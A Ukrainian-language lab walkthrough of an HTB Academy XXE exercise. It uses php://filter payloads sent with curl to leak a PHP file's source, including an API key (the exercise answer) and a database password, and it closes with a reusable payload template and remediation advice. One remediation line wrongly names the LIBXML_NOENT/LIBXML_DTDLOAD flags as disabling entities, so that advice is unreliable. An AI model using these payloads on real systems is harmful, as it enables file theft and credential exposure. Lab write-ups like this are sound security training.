# Web Attacks — XXE: Local File Disclosure via php://filter

Модуль: [Web Attacks](https://academy.hackthebox.com/app/module/134)
Секція: [XXE — Local File Disclosure](https://academy.hackthebox.com/app/module/134/section/1204)
Ціль: 10.129.234.170 (реальна IP атаки в лабі — 10.129.79.152)
Відповідь: `UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg`

## Важлива примітка щодо середовища

Ціль (10.129.79.152) знаходиться у внутрішній VPN-мережі лабораторії HTB Academy і не пінгується напряму з локальної Kali-машини — стандартна ситуація для "web-based" секцій академії, де доступ надається лише через власний Pwnbox/HTB Viewer у браузері academy, а не через персональний VPN-тунель. Тому всі команди (`curl`, `grep`, `cat`) виконувались безпосередньо в терміналі HTB Viewer (`eu-academy-5` / `htb-uzuwr8oefp`), а не з локальної Kali — це нормальний робочий процес для таких завдань і не є проблемою з мережею чи VPN-конфігурацією.

## Концепція

Контактна форма на сайті "Entity Services" відправляє дані не як стандартний form-urlencoded POST, а формує **сирий XML** прямо в JS (`XMLFunction()`) і шле його на `submitDetails.php`. Це і є передумова для XXE — сервер повинен парсити цей XML на backend'і (найімовірніше через `simplexml_load_string()` або `DOMDocument` з увімкненим `LIBXML_NOENT`), інакше зовнішні entity просто ігнорувались би.

Backend бере значення з полів XML (`name`, `tel`, `email`, `message`) і використовує їх у відповіді ("Check your email {email} for further instructions"). Це дає нам **reflected XXE** — ми підставляємо зовнішню entity в те поле, яке точно потрапляє у видиму відповідь, а не в поле, яке лише зберігається в БД без відображення.

Ключовий трюк — `php://filter/convert.base64-encode/resource=connection.php`. Пряме читання PHP-файлу (`file:///var/www/html/connection.php`) через XML entity змусило б PHP **виконати** його як код на сервері (а не показати нам вихідний текст), і ми побачили б лише порожній рядок (бо `$api_key` не виводиться echo). Обгортка `php://filter` перехоплює файл **до** виконання і кодує його вміст у Base64, тому entity розгортається не в результат виконання PHP, а в Base64-рядок з повним вихідним кодом файлу, включно з захардкодженими секретами.

## Крок 1 — Знаходимо реальний endpoint форми через клієнтський JS

```bash
curl -s "http://10.129.79.152/js/main.js" | grep -B30 'xmlhttp.open("POST","submitDetails.php"'
```

Це підтвердило те, що не вдалось при спробі "вгадати" endpoint у попередньому кроці: реальний шлях — `/submitDetails.php`, а не `/company_dashboard/company/add_company.php`. З коду видно точну структуру XML, яку формує frontend:

```xml
<root>
<name>...</name>
<tel>...</tel>
<email>...</email>
<message>...</message>
</root>
```

## Крок 2 — Baseline-перевірка: чи парситься наш XML взагалі

```bash
cat > xxe_payload.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
<root>
<name>&xxe;</name>
<tel>123456789</tel>
<email>test@test.com</email>
<message>test</message>
</root>
EOF

curl -s -X POST "http://10.129.79.152/submitDetails.php" \
  -H "Content-Type: application/xml" --data-binary @xxe_payload.xml
```

Результат: `Check your email test@test.com for further instructions.` — entity `&xxe;` в полі `<name>` розгорнулась, але саме поле `name` **не відображається** у відповіді сервера (лише email). Це підказало, що потрібно перемістити entity в те поле, яке реально виводиться назад.

## Крок 3 — Переносимо entity в поле `email` (те, що відображається)

```bash
cat > xxe_payload.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
<root>
<name>test</name>
<tel>123456789</tel>
<email>&xxe;</email>
<message>test</message>
</root>
EOF
```

Логіка: сервер бере значення `email` і вставляє його прямо у текст відповіді (`Check your email {email} for further instructions`) — тобто це **reflected sink**, ідеальна точка для виводу вкраденого файлу назовні без потреби в Out-of-Band ексфільтрації.

## Крок 4 — Відправляємо payload і декодуємо відповідь

```bash
curl -s -X POST "http://10.129.79.152/submitDetails.php" \
  -H "Content-Type: application/xml" --data-binary @xxe_payload.xml \
  | grep -oP '(?<=Check your email ).*?(?= for)' \
  | base64 -d
```

Пояснення пайплайну:
- `grep -oP '(?<=Check your email ).*?(?= for)'` — вирізає лише Base64-рядок з HTML-відповіді, використовуючи lookahead/lookbehind, щоб не захопити зайвий текст навколо.
- `base64 -d` — декодує вихідний PHP-код файлу `connection.php`, отриманий через `php://filter`.

Результат:
```php
<?php

$api_key = "UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg";

try {
	$conn = pg_connect("host=localhost port=5432 dbname=users user=postgres password=iUer^vd(e1Pl9");
}

catch ( exception $e ) {
 	echo $e->getMessage();
}

?>
```

Відповідь на завдання — значення `api_key`:
```
UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg
```

Бонус: попутно розкрито ще один секрет — пароль PostgreSQL (`iUer^vd(e1Pl9`) для `dbname=users`, що в реальному ангажменті стало б окремою знахідкою для lateral movement/post-exploitation.

## Чому це працює (root cause для звіту)

- **Опис:** Backend `/submitDetails.php` парсить XML, надісланий клієнтом, з увімкненою підтримкою зовнішніх сутностей (External Entities), не відхиляючи `DOCTYPE`/`ENTITY`-декларації.
- **Технічні деталі:** XML-парсер (ймовірно `simplexml_load_string()` без флага, що блокує зовнішні entity, або `libxml_disable_entity_loader(false)`) дозволяє визначити entity `SYSTEM "php://filter/..."`, яка при розгортанні читає довільний файл на файловій системі сервера через PHP-стрім-обгортку, обходячи виконання PHP-коду.
- **Ризик/Імпакт:** XXE → Local File Disclosure (CWE-611) — розкрито вихідний код бекенду, включно з захардкодженими секретами (`api_key`, пароль БД PostgreSQL). Це дає зловмиснику плацдарм для доступу до БД, підробки API-запитів чи подальшого pivot всередину інфраструктури.
- **Рекомендації:** Вимкнути обробку зовнішніх сутностей у XML-парсері (`libxml_disable_entity_loader(true)` для старих версій PHP, або явні флаги `LIBXML_NOENT`/`LIBXML_DTDLOAD` у `DOMDocument`/`SimpleXML`); ніколи не зберігати секрети (API-ключі, паролі БД) у відкритому вигляді в коді — використовувати змінні середовища або vault-рішення.

## Швидкий payload на майбутнє

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=TARGET_FILE.php">
]>
<root>
<name>test</name>
<tel>123456789</tel>
<email>&xxe;</email>
<message>test</message>
</root>
```

```bash
curl -s -X POST "http://TARGET/submitDetails.php" -H "Content-Type: application/xml" \
  --data-binary @xxe_payload.xml | grep -oP '(?<=Check your email ).*?(?= for)' | base64 -d
```
